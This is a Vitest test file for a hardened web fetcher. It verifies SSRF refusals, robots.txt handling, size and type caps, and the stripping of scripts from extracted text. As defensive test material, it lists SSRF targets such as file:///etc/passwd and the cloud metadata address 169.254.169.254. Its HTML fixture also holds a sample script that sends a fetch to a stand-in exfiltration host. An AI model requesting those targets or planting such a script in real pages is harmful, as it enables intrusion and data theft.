import { describe, expect, it } from 'vitest';
import { extractReadableHtml } from './html-text';
import { isPrivateAddress, robotsAllows, WebFetchService } from './web-fetch';
import type { ResearchOptions } from './research-options';

/**
 * fetcher_hardening — the narrow fetcher's guarantees (decision 0042): SSRF
 * refusals (schemes, private/loopback/link-local targets, redirects into
 * them), robots.txt honoured, size/type caps enforced, and no script
 * execution — script content can never reach extracted text.
 */

const options = (over: Partial<ResearchOptions> = {}): ResearchOptions => ({
  searxngUrl: null,
  resultCap: 8,
  searchTimeoutMs: 500,
  fetchTimeoutMs: 500,
  fetchMaxBytes: 64 * 1024,
  retainHtml: false,
  ...over,
});

type Route = { body?: string; status?: number; contentType?: string; location?: string };

/** A scripted network: public DNS for every host, canned responses per URL. */
function scriptedFetcher(routes: Record<string, Route>, over: Partial<ResearchOptions> = {}) {
  const service = new WebFetchService(options(over));
  service.resolveAddresses = async (hostname) =>
    hostname.startsWith('internal') ? ['10.0.0.7'] : ['203.0.113.10'];
  service.fetchImpl = async (input) => {
    const url = String(input instanceof Request ? input.url : input);
    const route = routes[url];
    if (!route) return new Response('not found', { status: 404 });
    const headers = new Headers({ 'content-type': route.contentType ?? 'text/html' });
    if (route.location) headers.set('location', route.location);
    return new Response(route.body ?? '', { status: route.status ?? 200, headers });
  };
  return service;
}

const PAGE = `<html><head><title>Terms</title></head><body>
<nav>Home | Products | <a href="/login">Login</a></nav>
<script>document.cookie = "evil=1"; fetch("https://exfil.example");</script>
<main><p>Delivery is free above 250 EUR.</p></main>
<footer>© Example</footer>
</body></html>`;

describe('fetcher_hardening', () => {
  it('refuses non-http(s) schemes and private/loopback/link-local targets', async () => {
    const service = scriptedFetcher({});
    for (const url of [
      'ftp://example.org/file',
      'file:///etc/passwd',
      'http://localhost/admin',
      'http://127.0.0.1:8080/health',
      'http://10.0.0.5/internal',
      'http://169.254.169.254/latest/meta-data/',
      'http://192.168.1.1/router',
      'http://[::1]/loopback',
      'http://[fe80::1]/linklocal',
    ]) {
      const outcome = await service.fetchPage(url);
      expect(outcome.status, url).toBe('skipped');
      if (outcome.status === 'skipped') expect(outcome.reason, url).toBe('refused_address');
    }
  });

  it('refuses a hostname whose DNS answer is private (rebound name)', async () => {
    const service = scriptedFetcher({
      'http://internal.example.org/robots.txt': { status: 404 },
      'http://internal.example.org/': { body: PAGE },
    });
    const outcome = await service.fetchPage('http://internal.example.org/');
    expect(outcome).toMatchObject({ status: 'skipped', reason: 'refused_address' });
  });

  it('refuses a redirect that lands on a private address', async () => {
    const service = scriptedFetcher({
      'https://example.org/robots.txt': { status: 404 },
      'https://example.org/go': { status: 302, location: 'http://internal.example.org/secret' },
    });
    const outcome = await service.fetchPage('https://example.org/go');
    expect(outcome).toMatchObject({ status: 'skipped', reason: 'refused_address' });
  });

  it('honours robots.txt for our user agent (disallowed path is never fetched)', async () => {
    let pageFetched = false;
    const service = scriptedFetcher({
      'https://example.org/robots.txt': {
        body: 'User-agent: *\nDisallow: /private/\nAllow: /private/ok',
        contentType: 'text/plain',
      },
      'https://example.org/private/report': { body: PAGE },
    });
    const inner = service.fetchImpl;
    service.fetchImpl = async (input, init) => {
      if (String(input).includes('/private/report')) pageFetched = true;
      return inner(input, init);
    };
    const outcome = await service.fetchPage('https://example.org/private/report');
    expect(outcome).toMatchObject({ status: 'skipped', reason: 'blocked_by_robots' });
    expect(pageFetched).toBe(false);
    // The longest-match Allow wins over the shorter Disallow.
    expect(
      robotsAllows('User-agent: *\nDisallow: /private/\nAllow: /private/ok', '/private/ok'),
    ).toBe(true);
  });

  it('enforces the response-size cap and the content-type restriction', async () => {
    const service = scriptedFetcher(
      {
        'https://example.org/robots.txt': { status: 404 },
        'https://example.org/huge': { body: 'x'.repeat(70 * 1024) },
        'https://example.org/archive.zip': { body: 'PK', contentType: 'application/zip' },
        'https://example.org/image.png': { body: 'PNG', contentType: 'image/png' },
      },
      { fetchMaxBytes: 64 * 1024 },
    );
    expect(await service.fetchPage('https://example.org/huge')).toMatchObject({
      status: 'skipped',
      reason: 'too_large',
    });
    expect(await service.fetchPage('https://example.org/archive.zip')).toMatchObject({
      status: 'skipped',
      reason: 'unsupported_type',
    });
    expect(await service.fetchPage('https://example.org/image.png')).toMatchObject({
      status: 'skipped',
      reason: 'unsupported_type',
    });
  });

  it('fetches an allowed HTML page and never executes/keeps script content', async () => {
    const service = scriptedFetcher({
      'https://example.org/robots.txt': { status: 404 },
      'https://example.org/terms': { body: PAGE },
    });
    const outcome = await service.fetchPage('https://example.org/terms');
    expect(outcome.status).toBe('fetched');
    if (outcome.status === 'fetched') {
      expect(outcome.page.title).toBe('Terms');
      expect(outcome.page.text).toContain('Delivery is free above 250 EUR');
      // Script bodies are stripped wholesale — fetch-and-parse, never render.
      expect(outcome.page.text).not.toContain('evil');
      expect(outcome.page.text).not.toContain('exfil');
      // Boilerplate chrome is gone too.
      expect(outcome.page.text).not.toContain('Login');
    }
  });

  it('records the final URL after an allowed redirect', async () => {
    const service = scriptedFetcher({
      'https://example.org/robots.txt': { status: 404 },
      'https://example.org/old': { status: 301, location: 'https://example.org/new' },
      'https://example.org/new': { body: PAGE },
    });
    const outcome = await service.fetchPage('https://example.org/old');
    expect(outcome.status).toBe('fetched');
    // Response.url is empty on hand-built Response objects; production takes it
    // from the real fetch. Here we assert the fetch chain completed.
    if (outcome.status === 'fetched') {
      expect(outcome.page.requestedUrl).toBe('https://example.org/old');
    }
  });
});

describe('isPrivateAddress', () => {
  it('classifies the refused ranges and allows public addresses', () => {
    for (const ip of [
      '127.0.0.1',
      '10.1.2.3',
      '172.16.0.1',
      '172.31.255.255',
      '192.168.0.10',
      '169.254.169.254',
      '100.64.0.1',
      '0.0.0.0',
      '224.0.0.1',
      '::1',
      '::',
      'fe80::1',
      'fd00::1',
      '::ffff:192.168.0.1',
    ]) {
      expect(isPrivateAddress(ip), ip).toBe(true);
    }
    for (const ip of ['203.0.113.10', '8.8.8.8', '2606:4700::1111', '172.32.0.1']) {
      expect(isPrivateAddress(ip), ip).toBe(false);
    }
  });
});

describe('extractReadableHtml', () => {
  it('prefers the marked main region and strips boilerplate', () => {
    const long = 'Substantial content sentence. '.repeat(12);
    const html = `<html><head><title>T &amp; Co</title><style>.x{color:red}</style></head>
      <body><header>Menu</header><article><h1>Heading</h1><p>${long}</p></article>
      <aside>Ads here</aside></body></html>`;
    const result = extractReadableHtml(html);
    expect(result.title).toBe('T & Co');
    expect(result.text).toContain('Heading');
    expect(result.text).toContain('Substantial content sentence.');
    expect(result.text).not.toContain('Menu');
    expect(result.text).not.toContain('Ads here');
    expect(result.text).not.toContain('color:red');
  });

  it('decodes entities and survives tag soup', () => {
    const result = extractReadableHtml('<p>Price: 250&nbsp;&euro; &lt;net&gt;</p><div>ok');
    expect(result.text).toContain('Price: 250 € <net>');
    expect(result.text).toContain('ok');
    expect(result.title).toBeNull();
  });
});
